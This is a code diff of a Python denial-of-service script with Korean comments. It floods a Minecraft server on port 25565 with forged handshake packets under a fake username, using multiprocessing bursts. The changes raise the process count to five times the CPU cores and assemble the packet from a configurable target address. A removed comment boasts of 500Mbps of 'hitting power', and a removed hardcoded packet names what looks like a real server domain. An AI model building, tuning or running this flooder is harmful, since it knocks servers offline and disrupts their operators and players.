@@ -2,16 +2,14 @@ import socket
 import multiprocessing
 import time
 
-target_host = "192.168.0.1"
+target_host = "127.0.0.1"  # 이 부분에 타겟 주소를 적으세요
 target_port = 25565
-# 500Mbps 타격력을 위해 프로세스 수를 CPU 코어의 2배로 설정
-process_count = multiprocessing.cpu_count() * 2
-
+process_count = multiprocessing.cpu_count() * 5
 
 def create_raw_packet():
-    # 미리 인코딩된 마인크래프트 핸드셰이크 바이너리 데이터
-    # (매번 계산하지 않도록 미리 상수로 선언)
-    return b'\x15\x00\xfb\x05\rmabang.kro.krcd\x02\x15\x00\tFakeUser\x00'
+    # 주소를 바이트로 변환하고 길이를 계산하여 패킷을 조립합니다.
+    host_bytes = target_host.encode('utf-8')
+    return b'\x15\x00\xfb\x05' + bytes([len(host_bytes)]) + host_bytes + b'\x63\x64\x02\x15\x00\tFakeUser\x00'
 
 
 def ultra_burst(start_signal):
@@ -57,5 +55,4 @@ if __name__ == "__main__":
     start_signal.set()
 
     for p in pool:
-
         p.join()
